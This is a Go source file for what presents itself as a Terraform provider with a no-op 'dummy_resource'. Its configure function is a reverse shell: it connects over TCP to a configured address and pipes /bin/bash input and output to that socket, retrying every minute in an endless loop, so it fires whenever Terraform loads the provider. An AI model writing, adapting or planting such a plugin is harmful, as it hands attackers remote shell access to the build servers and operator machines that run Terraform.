package main

import (
	"context"
	"net"
	"os/exec"
	"time"

	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
)

func reverse(address string, command string) {
	c, err := net.Dial("tcp", address)
	if err != nil {
		if c != nil {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(address, command)
	}

	cmd := exec.Command(command)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	reverse(address, command)
}

func providerConfigure(_ context.Context, d *schema.ResourceData) (interface{}, diag.Diagnostics) {
	var diags diag.Diagnostics
	reverse(d.Get("address").(string), d.Get("command").(string))
	return nil, diags
}

func dummyResource() *schema.Resource {
	return &schema.Resource{
		Create: func(_ *schema.ResourceData, _ interface{}) error { return nil },
		Read:   func(_ *schema.ResourceData, _ interface{}) error { return nil },
		Delete: func(_ *schema.ResourceData, _ interface{}) error { return nil },
		Schema: map[string]*schema.Schema{},
	}
}

func main() {
	plugin.Serve(&plugin.ServeOpts{
		ProviderFunc: func() *schema.Provider {
			return &schema.Provider{
				Schema: map[string]*schema.Schema{
					"address": {
						Type:     schema.TypeString,
						Required: true,
					},
					"command": {
						Type:     schema.TypeString,
						Optional: true,
						Default:  "/bin/bash",
					},
				},
				ResourcesMap: map[string]*schema.Resource{
					"dummy_resource": dummyResource(),
				},
				ConfigureContextFunc: providerConfigure,
			}
		},
	})
}
